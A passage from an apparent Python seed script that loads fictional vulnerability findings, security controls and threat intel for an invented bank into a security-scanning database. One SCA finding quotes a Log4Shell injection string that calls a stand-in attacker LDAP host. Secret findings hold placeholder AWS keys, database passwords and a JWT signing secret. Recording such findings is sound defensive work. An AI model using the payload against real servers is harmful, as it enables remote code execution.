    ("Missing Cache-Control Headers on Sensitive Responses", "Account balance and transaction responses don't include Cache-Control: no-store. Sensitive financial data may be cached by browsers or proxies.", "LOW", "CWE-525", "A05:2021 - Security Misconfiguration", 3.1, "src/main/java/com/apex/account/AccountController.java", 95, '// No cache control headers on sensitive endpoints', "Add Cache-Control: no-store, no-cache, must-revalidate to all responses containing financial data.", None, None, None, None),
    ("HTTP Method Not Restricted", "Transfer API endpoint responds to GET requests in addition to POST, potentially allowing CSRF attacks through image tags and link prefetching.", "LOW", "CWE-650", "A05:2021 - Security Misconfiguration", 3.5, "src/main/java/com/apex/transfer/TransferController.java", 38, '@RequestMapping("/api/transfers") // Accepts all HTTP methods', "Use specific mapping annotations (@PostMapping) instead of generic @RequestMapping.", None, None, None, None),
    ("Autocomplete Not Disabled on Sensitive Fields", "Login form and card activation form do not disable autocomplete on password and CVV fields.", "LOW", "CWE-524", "A04:2021 - Insecure Design", 2.0, "src/main/webapp/views/login.jsp", 28, '<input type="password" name="password" />', "Add autocomplete='off' to sensitive form fields.", None, None, None, None),
    ("Missing Subresource Integrity on CDN Scripts", "JavaScript libraries loaded from CDN without integrity hashes. Compromised CDN could inject malicious code.", "LOW", "CWE-353", "A08:2021 - Software and Data Integrity Failures", 3.0, "src/main/webapp/views/layout.jsp", 8, '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>', "Add integrity and crossorigin attributes to all CDN-loaded resources.", None, None, None, None),
    ("Version Information Disclosure in Server Headers", "Server response headers expose Spring Boot version and Apache Tomcat version.", "LOW", "CWE-200", "A05:2021 - Security Misconfiguration", 2.5, "src/main/resources/application.yml", 3, 'server.server-header=Apache-Coyote/1.1', "Remove or customize server identification headers.", None, None, None, None),
    ("Deprecated TLS Cipher Suites Enabled", "Server supports CBC-mode cipher suites (TLS_RSA_WITH_AES_128_CBC_SHA) vulnerable to padding oracle attacks.", "LOW", "CWE-327", "A02:2021 - Cryptographic Failures", 3.8, "src/main/resources/application.yml", 12, 'server.ssl.ciphers=TLS_RSA_WITH_AES_128_CBC_SHA,...', "Only enable AEAD cipher suites: AES-GCM and ChaCha20-Poly1305.", None, None, None, None),
    ("Missing robots.txt and Security.txt", "Application does not serve robots.txt or .well-known/security.txt files.", "LOW", "CWE-200", "A05:2021 - Security Misconfiguration", 1.5, "src/main/webapp/", 1, '# No robots.txt or security.txt', "Add robots.txt disallowing sensitive paths. Add security.txt per RFC 9116.", None, None, None, None),
    # INFO
    ("Spring Actuator Endpoints Accessible", "Spring Boot Actuator health and info endpoints exposed without authentication. While not directly exploitable, reveals application metadata.", "INFO", "CWE-200", "A05:2021 - Security Misconfiguration", 0.0, "src/main/resources/application.yml", 30, 'management.endpoints.web.exposure.include=health,info,metrics', "Restrict actuator access to internal network only. Require authentication for non-health endpoints.", None, None, None, None),
    ("TODO Comments Indicating Security Debt", "Multiple TODO comments in security-critical code indicating known security issues that haven't been addressed.", "INFO", "CWE-1078", "A04:2021 - Insecure Design", 0.0, "src/main/java/com/apex/auth/AuthService.java", 45, '// TODO: implement account lockout\n// TODO: add MFA verification\n// TODO: fix session fixation vulnerability', "Address all security TODOs. Create tickets for each item and prioritize.", None, None, None, None),
]

for f in sast_findings:
    title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed, remed_code, stride, mitre_id, mitre_name = f
    c.execute("""
        INSERT INTO vulnerabilities (scan_id, title, description, severity, cwe_id, owasp_category, cvss_score, file_path, line_number, code_snippet, remediation, remediation_code, stride_category, mitre_attack_id, mitre_attack_name, is_resolved, false_positive, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 0, ?)
    """, (SAST_SCAN_ID, title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed, remed_code, stride, mitre_id, mitre_name, NOW))

print(f"   → SAST scan ID {SAST_SCAN_ID}: {len(sast_findings)} findings")

# ============================================================
# 4. SCA SCAN
# ============================================================
print("[4/8] Adding SCA scan with findings...")
c.execute("""
    INSERT INTO scans (project_id, scan_type, status, started_at, completed_at, total_findings, critical_count, high_count, medium_count, low_count, info_count)
    VALUES (?, 'SCA', 'COMPLETED', ?, ?, 18, 3, 7, 6, 2, 0)
""", (PROJECT_ID, NOW, NOW))
SCA_SCAN_ID = c.lastrowid

sca_findings = [
    # CRITICAL
    ("CVE-2021-44228 — Log4Shell Remote Code Execution", "Apache Log4j2 2.14.1 is vulnerable to RCE via JNDI lookup injection in logged messages. Attacker sends crafted string (e.g., ${jndi:ldap://attacker.com/a}) in any logged field to execute arbitrary code on the server. CVSS 10.0. Actively exploited in the wild.", "CRITICAL", "CWE-502", "A08:2021 - Software and Data Integrity Failures", 10.0, "pom.xml", 89, '<dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-core</artifactId>\n    <version>2.14.1</version>\n</dependency>', "Upgrade to Log4j 2.17.1+. As immediate mitigation, set log4j2.formatMsgNoLookups=true.", None, None, None, None),
    ("CVE-2022-22965 — Spring4Shell RCE", "Spring Framework 5.3.17 is vulnerable to RCE via data binding to Class object properties on JDK 9+. Attacker can write JSP webshell via crafted HTTP request. CVSS 9.8.", "CRITICAL", "CWE-94", "A03:2021 - Injection", 9.8, "pom.xml", 34, '<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-webmvc</artifactId>\n    <version>5.3.17</version>\n</dependency>', "Upgrade Spring Framework to 5.3.18+ or 6.0.0+.", None, None, None, None),
    ("CVE-2023-34035 — Spring Security Authorization Bypass", "Spring Security 6.1.0 has authorization bypass when using requestMatchers with trailing slash. Attacker accesses /admin/ when /admin is protected.", "CRITICAL", "CWE-863", "A01:2021 - Broken Access Control", 9.1, "pom.xml", 45, '<dependency>\n    <groupId>org.springframework.security</groupId>\n    <artifactId>spring-security-web</artifactId>\n    <version>6.1.0</version>\n</dependency>', "Upgrade Spring Security to 6.1.2+.", None, None, None, None),
    # HIGH
    ("CVE-2022-42003 — Jackson Databind Deserialization DoS", "Jackson-databind 2.13.3 vulnerable to denial of service via deeply nested JSON objects when UNWRAP_SINGLE_VALUE_ARRAYS is enabled.", "HIGH", "CWE-502", "A08:2021 - Software and Data Integrity Failures", 7.5, "pom.xml", 67, '<version>2.13.3</version> <!-- jackson-databind -->', "Upgrade jackson-databind to 2.14.0+.", None, None, None, None),
    ("CVE-2023-20883 — Spring Boot Actuator DoS", "Spring Boot 3.0.6 actuator endpoint vulnerable to denial of service when Micrometer is used with Jersey.", "HIGH", "CWE-400", "A05:2021 - Security Misconfiguration", 7.5, "pom.xml", 12, '<parent>\n    <groupId>org.springframework.boot</groupId>\n    <version>3.0.6</version>\n</parent>', "Upgrade Spring Boot to 3.0.7+ or 3.1.1+.", None, None, None, None),
    ("CVE-2023-2976 — Guava Temp Directory Vulnerability", "Google Guava 31.0.1 creates temp files with insecure permissions, allowing local users to read/write sensitive data.", "HIGH", "CWE-732", "A01:2021 - Broken Access Control", 7.1, "pom.xml", 102, '<version>31.0.1-jre</version> <!-- guava -->', "Upgrade Guava to 32.0.0+.", None, None, None, None),
    ("CVE-2022-25647 — Gson Deserialization DoS", "Gson 2.8.6 vulnerable to denial of service via crafted JSON input causing excessive memory consumption.", "HIGH", "CWE-400", "A08:2021 - Software and Data Integrity Failures", 7.5, "pom.xml", 110, '<version>2.8.6</version> <!-- gson -->', "Upgrade Gson to 2.8.9+.", None, None, None, None),
    ("CVE-2023-35116 — Jackson Core Arbitrary Code Execution", "Jackson-core 2.13.3 allows arbitrary code execution when deserializing untrusted polymorphic types.", "HIGH", "CWE-502", "A08:2021 - Software and Data Integrity Failures", 8.1, "pom.xml", 65, '<version>2.13.3</version> <!-- jackson-core -->', "Upgrade to Jackson 2.15.0+. Enable default typing safeguards.", None, None, None, None),
    ("CVE-2022-41854 — SnakeYAML RCE", "SnakeYAML 1.30 (transitive via Spring Boot) vulnerable to RCE via crafted YAML input using Java constructors.", "HIGH", "CWE-502", "A08:2021 - Software and Data Integrity Failures", 8.8, "pom.xml", 0, 'snakeyaml-1.30.jar (transitive dependency)', "Upgrade SnakeYAML to 2.0+. Restrict YAML parsing to SafeConstructor.", None, None, None, None),
    ("CVE-2023-44487 — HTTP/2 Rapid Reset DoS", "Netty 4.1.94 (used by Spring WebFlux) vulnerable to HTTP/2 Rapid Reset attack allowing denial of service.", "HIGH", "CWE-400", "A05:2021 - Security Misconfiguration", 7.5, "pom.xml", 0, 'netty-codec-http2-4.1.94.Final.jar (transitive)', "Upgrade Netty to 4.1.100+.", None, None, None, None),
    # MEDIUM
    ("CVE-2023-1370 — json-smart DoS", "json-smart 2.4.8 vulnerable to stack overflow via deeply nested input.", "MEDIUM", "CWE-787", "A08:2021 - Software and Data Integrity Failures", 5.9, "pom.xml", 0, 'json-smart-2.4.8.jar (transitive)', "Upgrade json-smart to 2.4.9+.", None, None, None, None),
    ("CVE-2022-45688 — JSON-Java XXE", "org.json 20220924 vulnerable to XXE attacks via XML-to-JSON conversion.", "MEDIUM", "CWE-611", "A05:2021 - Security Misconfiguration", 5.3, "pom.xml", 115, '<version>20220924</version> <!-- org.json -->', "Upgrade org.json to 20230227+.", None, None, None, None),
    ("CVE-2023-20861 — Spring Expression Language DoS", "Spring Framework 5.3.26 SpEL evaluation vulnerable to DoS via crafted expressions.", "MEDIUM", "CWE-400", "A03:2021 - Injection", 5.3, "pom.xml", 34, 'spring-expression-5.3.26.jar', "Upgrade Spring Framework to 5.3.27+.", None, None, None, None),
    ("CVE-2023-0286 — OpenSSL X.509 Name Constraint Bypass", "BouncyCastle 1.70 (used for crypto operations) has X.509 certificate validation bypass.", "MEDIUM", "CWE-295", "A02:2021 - Cryptographic Failures", 5.9, "pom.xml", 120, '<version>1.70</version> <!-- bcprov-jdk15on -->', "Upgrade BouncyCastle to 1.73+.", None, None, None, None),
    ("CVE-2022-41881 — Netty Codec HAProxy DoS", "Netty 4.1.94 HAProxyMessageDecoder vulnerable to infinite loop via crafted input.", "MEDIUM", "CWE-835", "A05:2021 - Security Misconfiguration", 5.3, "pom.xml", 0, 'netty-codec-haproxy-4.1.94.Final.jar', "Upgrade Netty to 4.1.86+.", None, None, None, None),
    ("Outdated PostgreSQL JDBC Driver", "PostgreSQL JDBC driver 42.3.3 has known information disclosure vulnerability. Multiple CVEs patched in later versions.", "MEDIUM", "CWE-200", "A06:2021 - Vulnerable and Outdated Components", 5.0, "pom.xml", 75, '<version>42.3.3</version> <!-- postgresql -->', "Upgrade postgresql driver to 42.6.0+.", None, None, None, None),
    # LOW
    ("Outdated Apache Commons IO", "Commons IO 2.11.0 is outdated. While no critical CVEs, newer versions include security hardening for file operations.", "LOW", "CWE-200", "A06:2021 - Vulnerable and Outdated Components", 3.0, "pom.xml", 130, '<version>2.11.0</version> <!-- commons-io -->', "Upgrade to commons-io 2.15.0+.", None, None, None, None),
    ("Outdated Apache HttpClient", "HttpClient 4.5.13 is end-of-life. Recommend migration to HttpClient 5.x for security improvements.", "LOW", "CWE-200", "A06:2021 - Vulnerable and Outdated Components", 2.0, "pom.xml", 135, '<version>4.5.13</version> <!-- httpclient -->', "Migrate to Apache HttpClient 5.2+.", None, None, None, None),
]

for f in sca_findings:
    title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed, remed_code, stride, mitre_id, mitre_name = f
    c.execute("""
        INSERT INTO vulnerabilities (scan_id, title, description, severity, cwe_id, owasp_category, cvss_score, file_path, line_number, code_snippet, remediation, remediation_code, stride_category, mitre_attack_id, mitre_attack_name, is_resolved, false_positive, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 0, ?)
    """, (SCA_SCAN_ID, title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed, remed_code, stride, mitre_id, mitre_name, NOW))

print(f"   → SCA scan ID {SCA_SCAN_ID}: {len(sca_findings)} findings")

# ============================================================
# 5. SECRET SCAN
# ============================================================
print("[5/8] Adding Secret scan with findings...")
c.execute("""
    INSERT INTO scans (project_id, scan_type, status, started_at, completed_at, total_findings, critical_count, high_count, medium_count, low_count, info_count)
    VALUES (?, 'SECRET', 'COMPLETED', ?, ?, 12, 4, 5, 2, 1, 0)
""", (PROJECT_ID, NOW, NOW))
SECRET_SCAN_ID = c.lastrowid

secret_findings = [
    ("AWS Access Key ID in Configuration", "AWS IAM access key ID found in application configuration file. Provides programmatic access to AWS services (S3, RDS, SQS). Key prefix AKIA indicates a long-term access key (not temporary STS credentials).", "CRITICAL", "CWE-798", "A07:2021 - Identification and Authentication Failures", 9.5, "src/main/resources/application-prod.yml", 48, 'aws.access-key-id=AKIAIOSFODNN7EXAMPLE\naws.secret-access-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', "Rotate the key immediately. Use IAM roles for EC2/EKS instead of access keys. If keys are needed, use AWS Secrets Manager."),
    ("Production Database Password in Properties", "PostgreSQL production database password hardcoded in configuration. Password provides full DBA access to the core banking database containing customer PII and financial data.", "CRITICAL", "CWE-798", "A07:2021 - Identification and Authentication Failures", 9.8, "src/main/resources/application-prod.yml", 23, 'spring.datasource.url=jdbc:postgresql://apex-prod-db.us-east-1.rds.amazonaws.com:5432/apexbank\nspring.datasource.username=apex_prod_admin\nspring.datasource.password=Apex$Prod2024!SecureDB', "Rotate the password immediately. Migrate to AWS Secrets Manager with automatic rotation. Use IAM database authentication."),
    ("Stripe API Secret Key", "Stripe production secret key (sk_live_*) found in payment processing service. Allows creating charges, refunds, and accessing all payment data.", "CRITICAL", "CWE-798", "A07:2021 - Identification and Authentication Failures", 9.5, "src/main/java/com/apex/payment/StripeConfig.java", 12, 'private static final String STRIPE_SECRET_KEY = "sk_live_51NqGkCKZ8xR4EXAMPLE...";', "Rotate the Stripe key immediately in the Stripe Dashboard. Store in environment variable or secrets manager."),
    ("JWT Signing Secret in Source Code", "HMAC-SHA256 JWT signing secret hardcoded in authentication service. Knowing this secret allows forging valid authentication tokens for any user.", "CRITICAL", "CWE-798", "A02:2021 - Cryptographic Failures", 9.8, "src/main/java/com/apex/auth/JwtTokenProvider.java", 8, 'private static final String JWT_SECRET = "ApexBanking2024SecretKeyForJWTSigning!@#$%^&*";', "Switch to RSA key pair (RS256). Store private key in HSM or AWS KMS. Rotate immediately."),
    ("Redis Password in Docker Compose", "Redis authentication password exposed in docker-compose.yml checked into Git. Redis stores session data and cached customer information.", "HIGH", "CWE-798", "A07:2021 - Identification and Authentication Failures", 8.0, "docker-compose.yml", 34, 'redis:\n    image: redis:7-alpine\n    command: redis-server --requirepass "ApexRedis2024Prod!"', "Move to environment variable or Docker secrets. Use .env file (gitignored) or orchestrator secret management."),
    ("Kafka Broker Credentials in Config", "Apache Kafka SASL/PLAIN credentials for the production event bus. Kafka carries all transaction events, fraud alerts, and account change notifications.", "HIGH", "CWE-798", "A07:2021 - Identification and Authentication Failures", 8.5, "src/main/resources/application-prod.yml", 62, 'spring.kafka.properties.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="apex-producer" password="K@fk@Pr0d2024!";', "Use SASL/SCRAM or mTLS for Kafka authentication. Store credentials in AWS Secrets Manager."),
    ("SendGrid API Key for Email Notifications", "SendGrid API key with full access found in notification service. Allows sending emails as the bank and accessing email activity/statistics.", "HIGH", "CWE-798", "A07:2021 - Identification and Authentication Failures", 7.5, "src/main/java/com/apex/notification/EmailService.java", 18, 'private static final String SENDGRID_API_KEY = "SG.EXAMPLE_KEY_FULL_ACCESS...";', "Rotate the key. Use restricted API key with only mail.send permission. Store in environment variable."),
    ("Twilio Auth Token for SMS OTP", "Twilio account SID and auth token hardcoded in SMS OTP service. Allows sending SMS as the bank and accessing message logs.", "HIGH", "CWE-798", "A07:2021 - Identification and Authentication Failures", 7.8, "src/main/java/com/apex/auth/SmsOtpService.java", 14, 'private static final String TWILIO_SID = "ACexample...";\nprivate static final String TWILIO_AUTH = "auth_token_example_123";', "Rotate Twilio credentials. Use environment variables."),
    ("Marqeta API Key for Card Processor", "Marqeta (card processor) API key found in card management service. Provides access to card operations: activate, freeze, set limits, view transactions.", "HIGH", "CWE-798", "A07:2021 - Identification and Authentication Failures", 8.2, "src/main/java/com/apex/card/MarqetaClient.java", 22, 'private static final String MARQETA_APP_TOKEN = "app_token_example_xyz";\nprivate static final String MARQETA_ADMIN_TOKEN = "admin_token_example_abc";', "Rotate Marqeta tokens. Use environment variables backed by AWS Secrets Manager."),
    ("SSH Private Key in Repository", "RSA private key for bastion host SSH access found in deployment scripts. Provides access to the internal network where database and application servers reside.", "MEDIUM", "CWE-798", "A07:2021 - Identification and Authentication Failures", 7.0, "deploy/bastion-key.pem", 1, '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...', "Remove from repository. Rotate the key. Use AWS Session Manager or SSM instead of SSH keys."),
    ("Slack Webhook URL for AlertOps", "Slack incoming webhook URL found in alert configuration. Allows posting messages to the #security-alerts channel.", "MEDIUM", "CWE-798", "A05:2021 - Security Misconfiguration", 4.0, "src/main/resources/alerting.yml", 8, 'slack.webhook.url=https://hooks.slack.com/services/T0EXAMPLE/B0EXAMPLE/xxxx', "Move to environment variable. Restrict webhook permissions."),
    ("Internal API Documentation Password", "Password for internal Swagger UI authentication hardcoded in properties file.", "LOW", "CWE-798", "A07:2021 - Identification and Authentication Failures", 3.0, "src/main/resources/application.yml", 55, 'springdoc.swagger-ui.auth.username=apex-dev\nspringdoc.swagger-ui.auth.password=SwaggerDev2024', "Move to environment variable. Disable Swagger in production."),
]

for f in secret_findings:
    title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed = f
    c.execute("""
        INSERT INTO vulnerabilities (scan_id, title, description, severity, cwe_id, owasp_category, cvss_score, file_path, line_number, code_snippet, remediation, is_resolved, false_positive, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 0, ?)
    """, (SECRET_SCAN_ID, title, desc, sev, cwe, owasp, cvss, fpath, line, snippet, remed, NOW))

print(f"   → Secret scan ID {SECRET_SCAN_ID}: {len(secret_findings)} findings")

# ============================================================
# 6. SECURITY CONTROLS
# ============================================================
print("[6/8] Adding security controls...")
# linked_threat_ids map controls to threat model threat IDs (threat_0 through threat_16)
controls_data = [
    # (name, desc, type, status, stride_cats, effectiveness, owner, evidence, linked_threat_ids)
    ("Web Application Firewall (WAF)", "AWS WAF with OWASP CRS v3.3 ruleset protecting all public-facing APIs and web application. Includes custom rules for banking-specific attack patterns (SQLi, XSS, SSRF). Rate limiting at edge layer.", "PREVENTIVE", "IMPLEMENTED", ["Spoofing", "Tampering", "Information Disclosure"], 0.85, "Platform Security", "WAF dashboard: https://console.aws.amazon.com/wafv2/", ["threat_0", "threat_4", "threat_5"]),
    ("Multi-Factor Authentication (MFA)", "Adaptive MFA using FIDO2/WebAuthn, TOTP, and SMS OTP for customer authentication. Risk-based step-up triggers for new devices, impossible travel, and elevated transaction amounts.", "PREVENTIVE", "IMPLEMENTED", ["Spoofing"], 0.92, "Identity & Access", "MFA policy document v2.1, FIDO2 registration flow tested", ["threat_1", "threat_2", "threat_3"]),
    ("Data Encryption at Rest (AES-256-GCM)", "AES-256-GCM encryption for all PII/PCI data in PostgreSQL via AWS RDS encryption. Application-level column encryption for SSN, account numbers using AWS KMS managed keys.", "PREVENTIVE", "IMPLEMENTED", ["Information Disclosure"], 0.95, "Data Security", "Encryption audit report Q1 2026, KMS key rotation policy active", ["threat_9", "threat_10"]),
    ("TLS 1.3 in Transit Encryption", "TLS 1.3 enforced on all external connections. mTLS for internal service-to-service (gRPC). HSTS enabled with preload. Certificate pinning on mobile app.", "PREVENTIVE", "PARTIAL", ["Information Disclosure", "Tampering"], 0.80, "Infrastructure Security", "TLS configuration audit — TLS 1.0/1.1 still enabled on 2 legacy payment processor endpoints, remediation ETA: Sprint 25", ["threat_9", "threat_11"]),
    ("Real-Time Fraud Detection Engine", "ML-based transaction monitoring consuming Kafka events. Velocity checks (>5 transfers/hour triggers review), geo-anomaly detection, device fingerprinting, behavioral biometrics scoring. Flagged transactions queued for manual review.", "DETECTIVE", "IMPLEMENTED", ["Spoofing", "Tampering", "Elevation of Privilege"], 0.88, "Fraud Operations", "Fraud engine dashboard, 99.2% detection rate on test dataset, 0.3% false positive rate", ["threat_2", "threat_4", "threat_14"]),
    ("Centralized Audit Logging (SIEM)", "All application events forwarded to Splunk SIEM with 13-month retention. Correlation rules for auth failures (>5/min), privilege escalation, data exfiltration patterns. SOC monitors 24/7.", "DETECTIVE", "PARTIAL", ["Repudiation"], 0.65, "Security Operations", "Splunk dashboards configured — admin action logging incomplete per SOX audit finding FY26-017. Wire transfer approval logs missing approver IP. Remediation in progress.", ["threat_7", "threat_8"]),
    ("OFAC/SDN Sanctions Screening", "Real-time screening of all wire transfer beneficiaries against OFAC SDN, EU consolidated sanctions, and UK HMT lists. Fuzzy name matching with 85% threshold. Auto-block on match, manual review queue for near-matches.", "PREVENTIVE", "IMPLEMENTED", ["Elevation of Privilege"], 0.90, "BSA/AML Compliance", "Sanctions screening vendor: Dow Jones Risk & Compliance. Daily list update via API. Last audit: zero false negatives.", ["threat_14"]),
    ("Role-Based Access Control (RBAC)", "Four-tier RBAC: Teller (view/basic ops), Supervisor (approve transfers <$50K), Compliance Officer (SAR filing, monitoring), Admin (user provisioning, config). Enforced at API gateway + application layer.", "PREVENTIVE", "IMPLEMENTED", ["Elevation of Privilege", "Spoofing"], 0.82, "Identity & Access", "RBAC matrix v3.0, quarterly access review completed Mar 2026, 12 excess permissions revoked", ["threat_15", "threat_6"]),
    ("API Rate Limiting & Bot Protection", "API gateway rate limiting: 100 req/min authenticated, 20 req/min unauthenticated. Login endpoint: 5 attempts/min with progressive delays. Bot detection via device fingerprinting and CAPTCHA after 3 failures.", "PREVENTIVE", "PLANNED", ["Denial of Service", "Spoofing"], 0.50, "API Platform", "Rate limiting design doc approved. Implementation scheduled Sprint 24. Currently only basic IP-based throttling at ALB.", ["threat_2", "threat_12", "threat_13"]),
    ("Container Image Scanning (Trivy)", "Trivy scanning on all container images in CI/CD pipeline. Policy: block deployment if critical CVE present, warn on high. Weekly re-scan of running images in EKS. SBOM generation for each release.", "DETECTIVE", "IMPLEMENTED", ["Tampering"], 0.78, "DevSecOps", "CI/CD pipeline integrated, last 30-day report: 3 critical blocked, 12 high flagged", ["threat_4"]),
    ("DDoS Protection (AWS Shield Advanced)", "AWS Shield Advanced with CloudFront CDN for volumetric DDoS mitigation. Auto-scaling EKS node groups for application-layer attacks. SRT (Shield Response Team) engaged for L7 attacks.", "PREVENTIVE", "IMPLEMENTED", ["Denial of Service"], 0.90, "Infrastructure Security", "AWS Shield subscription active, $3K/month. Last DDoS event (Feb 2026): 42Gbps mitigated with zero downtime.", ["threat_12", "threat_13"]),
    ("Secrets Management (AWS Secrets Manager)", "Centralized secrets management for API keys, database credentials, and encryption keys. Automatic rotation for DB passwords (30-day cycle). Vault integration for SWIFT gateway certificates.", "PREVENTIVE", "PARTIAL", ["Information Disclosure"], 0.60, "Platform Security", "Migration in progress — 8 of 15 secrets migrated from config files. Remaining: Stripe, Twilio, SendGrid, Kafka, Redis, Marqeta, SSH key. Target completion: Sprint 26.", ["threat_9", "threat_10"]),
    ("Input Validation Framework", "Custom validation framework using Bean Validation (JSR 380). Banking-specific validators: account number format (Luhn), routing number (ABA checksum), monetary amounts (positive, 2 decimal max, daily limits), SWIFT BIC format.", "PREVENTIVE", "IMPLEMENTED", ["Tampering", "Information Disclosure"], 0.75, "Application Security", "Validation framework docs, 94% code coverage on validators", ["threat_4", "threat_5", "threat_6"]),
    ("Vulnerability Management Program", "Monthly vulnerability scans (Qualys). Annual penetration test (NCC Group). Continuous SAST (Semgrep) and SCA (Snyk) in CI/CD. Critical: 24hr SLA, High: 7-day SLA, Medium: 30-day SLA.", "DETECTIVE", "IMPLEMENTED", ["Tampering", "Information Disclosure", "Elevation of Privilege"], 0.80, "Application Security", "Latest pentest: NCC Group Feb 2026, 4 findings (2 high, 2 medium), all remediated. Qualys scan: 0 critical, 3 high open.", ["threat_4", "threat_14", "threat_16"]),
    ("Incident Response Plan", "Documented IR plan aligned to NIST 800-61. 4-hour SLA for critical security incidents. Tabletop exercises quarterly (last: Feb 2026 — ransomware scenario). PagerDuty on-call rotation with 15-min acknowledgment SLA.", "CORRECTIVE", "IMPLEMENTED", ["Spoofing", "Tampering", "Repudiation", "Information Disclosure", "Denial of Service", "Elevation of Privilege"], 0.70, "Security Operations", "IR playbook v4.2, last tabletop results: 3hr15min MTTD, 6hr20min MTTR. Board report submitted.", ["threat_0", "threat_4", "threat_7", "threat_12", "threat_14"]),
]

for ctrl in controls_data:
    name, desc, ctype, status, stride, eff, owner, evidence, linked_threats = ctrl
    c.execute("""
        INSERT INTO security_controls (project_id, name, description, control_type, status, stride_categories, effectiveness, owner, evidence, linked_threat_ids, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (PROJECT_ID, name, desc, ctype, status, json.dumps(stride), eff, owner, evidence, json.dumps(linked_threats), USER_ID, NOW))

print(f"   → {len(controls_data)} security controls created")

# ============================================================
# 7. CLIENT THREAT INTEL
# ============================================================
print("[7/8] Adding client threat intel...")
intel_entries = [
    ("FIN7 Targeting US Banking Platforms", "FIN7 (aka Carbanak) actively targeting US digital banking platforms with spearphishing campaigns delivering JSSLoader and Carbanak backdoor. Recent campaigns impersonate banking regulators (OCC, FDIC) sending fake examination notices. Infrastructure observed using compromised legitimate domains for C2.", "threat_actor", "critical", "Spoofing", '["T1566.001", "T1059.007", "T1055"]', '["PCI-DSS v4.0 Req 5", "FFIEC CAT"]', '["Email gateway with URL sandboxing", "EDR with behavioral detection", "Network segmentation"]', '["FIN7", "banking", "spearphishing", "APT"]', "FS-ISAC Alert 2026-0312"),
    ("Magecart Skimming on Banking Payment Pages", "Web skimming attacks targeting online banking bill payment and card management pages. Attackers inject malicious JavaScript via compromised third-party scripts (analytics, chat widgets) to exfiltrate card numbers and credentials in real-time.", "scenario", "critical", "Tampering", '["T1189", "T1059.007", "T1041"]', '["PCI-DSS v4.0 Req 6.4.3", "PCI-DSS v4.0 Req 11.6.1"]', '["Content Security Policy", "Subresource Integrity", "Client-side monitoring"]', '["magecart", "skimming", "PCI", "javascript"]', "PCI SSC Bulletin 2026-02"),
    ("Credential Stuffing Attacks on Banking APIs", "Large-scale credential stuffing campaigns observed against banking login APIs using credentials from recent breaches (23andMe, MGM Resorts). Attackers use residential proxy networks to bypass IP-based rate limiting. Average 2M attempts/day across the sector.", "scenario", "high", "Spoofing", '["T1110.004", "T1078.001"]', '["FFIEC Authentication Guidance", "NIST 800-63B"]', '["Adaptive MFA", "Bot detection (device fingerprinting)", "Breached credential monitoring"]', '["credential-stuffing", "brute-force", "authentication"]', "FS-ISAC TLP:AMBER 2026-Q1"),
    ("SIM Swap Fraud for SMS OTP Bypass", "Coordinated SIM swap attacks targeting banking customers to intercept SMS OTP codes. Attackers social-engineer mobile carriers to port victim's number, then reset banking passwords using intercepted OTP. 340% increase in Q1 2026.", "scenario", "high", "Spoofing", '["T1111", "T1078"]', '["FFIEC Authentication Guidance"]', '["FIDO2/WebAuthn as primary MFA", "Deprecate SMS OTP", "Out-of-band verification for account changes"]', '["SIM-swap", "MFA-bypass", "SMS", "social-engineering"]', "FBI IC3 Alert I-030826-PSA"),
    ("BSA/AML Regulation — Enhanced Due Diligence", "FinCEN updated BSA/AML regulations requiring enhanced due diligence for all wire transfers >$3,000 (reduced from $10,000). Institutions must screen all transactions against updated OFAC SDN list within 24 hours of list updates. Non-compliance penalty: up to $1M per violation.", "regulation", "critical", "Elevation of Privilege", '["T1548"]', '["BSA/AML", "OFAC", "FinCEN"]', '["Real-time sanctions screening on ALL transfers", "Automated SDN list update within 4 hours", "SAR filing automation"]', '["BSA", "AML", "OFAC", "sanctions", "compliance"]', "FinCEN Advisory FIN-2026-A001"),
    ("Insider Threat — Privileged Access Abuse in Banking", "Multiple incidents across the sector of bank employees with elevated privileges exfiltrating customer data for identity theft. Common pattern: teller or operations staff bulk-querying customer records outside business need. Average detection time: 147 days.", "threat_actor", "high", "Information Disclosure", '["T1078.002", "T1005", "T1567"]', '["SOX Section 404", "GLBA Safeguards Rule"]', '["User behavior analytics (UEBA)", "Least-privilege access reviews", "Data loss prevention (DLP)", "Mandatory audit logging"]', '["insider-threat", "privileged-access", "data-exfiltration"]', "CERT Insider Threat Report 2026"),
    ("Open Banking API Security Risks", "Increased exploitation of Open Banking (PSD2/FDX) API implementations. Attackers abuse consent flows to gain persistent access to customer accounts. SSRF vulnerabilities in callback URL handling allow internal network reconnaissance.", "scenario", "high", "Tampering", '["T1190", "T1090", "T1557"]', '["PSD2 RTS on SCA", "FDX Security Profile"]', '["Strict redirect URI validation", "Certificate-bound access tokens", "FAPI compliance"]', '["open-banking", "API-security", "OAuth", "FAPI"]', "OWASP Financial API Security WG"),
    ("Ransomware Targeting Financial Services Infrastructure", "LockBit 4.0 and BlackCat/ALPHV actively targeting financial services. Initial access via VPN vulnerabilities (Fortinet, Citrix) and phishing. Encrypt core banking databases and threaten regulatory disclosure. Average ransom demand: $4.2M.", "scenario", "critical", "Denial of Service", '["T1486", "T1490", "T1133"]', '["FFIEC BCM Handbook", "NIST CSF PR.IP-4"]', '["Immutable backups (air-gapped)", "Network segmentation", "VPN patching SLA <24h for critical CVEs"]', '["ransomware", "LockBit", "business-continuity"]', "CISA Alert AA26-045A"),
]

for entry in intel_entries:
    title, desc, itype, sev, stride, mitre, reg, controls, tags, source = entry
    c.execute("""
